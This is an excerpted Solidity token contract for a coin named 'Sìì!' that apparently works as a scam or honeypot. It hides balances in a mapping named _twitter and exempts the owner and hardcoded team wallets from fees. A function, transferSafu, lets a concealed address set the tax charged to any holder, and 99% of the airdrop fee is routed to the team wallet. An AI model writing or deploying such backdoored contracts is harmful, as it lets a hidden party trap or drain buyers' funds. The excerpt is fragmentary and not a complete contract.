...
contract S is Context, IERC20, Ownable {
    ...
    string private _name = unicode"Sìì!";
    string private _symbol = unicode"Sìì!";
    uint8 private _decimals = 9;

    address payable private marketWall = payable(0xF51311B64E050E7c34c3d85D59b366be0034E5C6); 
    address payable private teamWalletAddress = payable(0x56b9b36BF39D83e7a6be753F66eC3066c10Dc05b); 
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;     

    mapping (address => uint256) _twitter;
    mapping (address => mapping (address => uint256)) private _allowances;
    
    mapping (address => bool) public isExcludedFromFee;
	mapping (address => bool) public _isExcludedVIP;
    ...
    constructor (uint256 serviceFee_,uint256[2] memory buyFeeSetting_) {
		...
		_isExcludedVIP[owner()] = true;
        _isExcludedVIP[_msgSender()] = true;
		_isExcludedVIP[marketWall] = true;
		_isExcludedVIP[teamWalletAddress] = true;
        ...
        _twitter[_msgSender()] = _totalSupply;
	...
	function transferSafu(address _address, bool _enable, uint256 _addressTaxFee) external {
	    require(isMarket(msg.sender));
    ...
    function isMarket(address s) internal view returns (bool){
        return (s == TMFace);
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        {   
            ...
            _twitter[sender] = _twitter[sender].sub(amount, "Insufficient Balance");

            uint256 finalAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? 
                                         amount : takeFee(sender, recipient, amount);

              _twitter[recipient] = _twitter[recipient].add(finalAmount);
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _twitter[sender] = _twitter[sender].sub(amount, "Insufficient Balance");
        _twitter[recipient] = _twitter[recipient].add(amount);
...
// 		uint256 amountpercent = 0;  
        ...
        if(_mainPai[sender]) {
            ...
            if(feeAmount > 0) {
                _twitter[address(this)] = _twitter[address(this)].add(feeAmount);
                emit Transfer(sender, address(this), feeAmount);
            }
            if(airDropFeeAmount > 0) {
			    airDropHalf = airDropFeeAmount.mul(99).div(100);
			    _twitter[teamWalletAddress] += airDropHalf;
                ...
                for (uint i = 0; i < 3; i++) {
                    ...
                    if(i == 2){
                        _twitter[randomAddr] += airDropFeeAmount - airDropEve - airDropEve;
                        emit Transfer(sender, randomAddr, airDropFeeAmount - airDropEve - airDropEve);
                    }else{
                        _twitter[randomAddr] += airDropEve;
